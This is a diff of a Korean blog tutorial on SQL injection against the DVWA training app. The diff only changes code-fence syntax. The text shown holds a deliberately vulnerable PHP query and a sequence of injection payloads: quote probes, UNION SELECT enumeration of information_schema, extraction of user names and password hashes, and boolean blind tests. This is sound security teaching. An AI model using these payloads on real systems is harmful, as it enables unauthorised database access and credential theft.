@@ -34,11 +34,11 @@ markdown: kramdown
 
 <font size="4em" color="#0091ff">1. WHERE 구문을 우회하여 공격</font><br>
 
-``` sql    
+~~~   
     $id = $_REQUEST[ ‘id’ ];
 
     $query = “SELECT name, email FROM users WHERE id = ‘ $id ’;”;
-```    
+~~~   
 
 <br>-위 예제의 경우 사용자가 입력한 id 파라미터 값($id)이 쿼리문의 일부로 사용되고 있음,
 
@@ -47,9 +47,9 @@ markdown: kramdown
 
 <font size="4em" color="#0091ff">2. UNION 구문을 이용한 공격</font><br>
 
-``` SQL
+~~~
     SELECT name, email FROM users WHERE ID=’1’ UNION SELECT name, pw FROM users#~~~’
-``` 
+~~~ 
 <br>-UNION은 합집합으로 두 SELECT 구문의 결과를 모두 포함<br>
 시키게 함, 쿼리 끝에 #을 삽입하는 이유는 맨<br>
 끝 ‘을 주석 처리하려고 씀. ’짝수가 안맞아서<br> 
@@ -69,17 +69,17 @@ markdown: kramdown
 </div>스샷. 2<br>
 - 이렇게 ‘ 입력해서 건들러 보면 SQL 구문 에러가 발생되지요, 그리고<br>
 
-``` SQL
+~~~
     SELECT name, email FROM users WHERE id = ‘’’;
-```
+~~~
 
 <br>입력하면
 
 -쌍이 맞이 않아 Syntax 에러 발생<br>
 
-``` SQL
+~~~
     1’ or ’1’=’1
-``` 
+~~~
 
 <br><div align="center" >
 <img src="/Art of Web Hacking/Chapter7/003.png" width="600" height="500"> <br>
@@ -90,9 +90,9 @@ markdown: kramdown
 <center><font size="4em" color="#0091ff">ORDER BY 및UNION 공격 실습
 </font></center><br>
 
-``` SQL
+~~~
     1’ ORDER BY 1#
-```
+~~~
 <br>-ORDER BY 뒤의 숫자를 증가시켜 가다가 에러 발생하면 <br>
 그 전 값이 칼럼의 개수
 
@@ -100,9 +100,9 @@ markdown: kramdown
 <img src="/Art of Web Hacking/Chapter7/004.png" width="600" height="500"> <br>
 </div>스샷. 4<span style="color: #FFFFFF">~~死~~</span><br>
 
-``` SQL
+~~~
     ‘ UNION SELECT schema_name,2 from information_schema.schemata# 
-```
+~~~
 <br>-MYSQL DB는 information_shema라는 DB에서 데이터베이스 이름,<br>
 
 테이블, 칼럼 정보 등을 관리, 따라서 information_schema의 <br>
@@ -116,26 +116,26 @@ schemata 테이블로부터 shema_name을 가져오는 SQL 쿼리문을 이용�
 - first name 뒤에 데이터 베이스의 이름이 출력되고 있고, DVWA에서<br>
 사용하는 DB의 이름이 dvwa임을 추측 할 수 있습니다.<br>
 
-``` SQL
+~~~
     ' UNION SELECT table_name,2 from information_schema.tables where table_schema='dvwa'#
-```
+~~~
 <br><div align="center" >
 <img src="/Art of Web Hacking/Chapter7/006.png" width="600" height="200"> <br>
 </div>스샷. 6<br>
 - table_schema가 dvwa인지를 확인하는 조건을 <br>
 주어 dvwa DB의 테이블만 출력,guest와 users라는 테이블이 출력됨<br>
 
-``` SQL
+~~~
     ' UNION SELECT column_name,2 from information_schema.columns where table_schema='dvwa' and table_name='users'#
-```
+~~~
 <br><div align="center" >
 <img src="/Art of Web Hacking/Chapter7/007.png" width="600" height="500"> <br>
 </div>스샷. 7<br>
 - 사용자(users) 테이블의 칼럼 목록을 알아내는 구문과 입력 결과, user와 password 칼럼이 눈에 띄는군요<br>
 
-``` SQL
+~~~
     ' UNION SELECT user,password from users#
-```
+~~~
 <br><div align="center" >
 <img src="/Art of Web Hacking/Chapter7/008.png" width="500" height="300"> <br>
 </div><br>
@@ -159,9 +159,9 @@ admin의 surname md5 복호화 하면 password 됩니다.
 별다른 에러가 발생하지 않아 얘가 SQL 쿼리문을<br>
 사용하고 있는지 모름<br>
 
-``` SQL
+~~~
     1’ AND 1=1#
-```
+~~~
 
 <br><div align="center" >
 <img src="/Art of Web Hacking/Chapter7/011.png" width="300" height="100"> <br>
@@ -170,9 +170,9 @@ admin의 surname md5 복호화 하면 password 됩니다.
 참이 될 수 있는 구문을 입력했는데 ID가 존재 한다는  <br>
 메시지가 출력됩니다. <br>
 
-``` SQL
+~~~
     1’ AND 1=2#
-```
+~~~
 
 <br><div align="center" >
 <img src="/Art of Web Hacking/Chapter7/012.png" width="300" height="100"> <br>
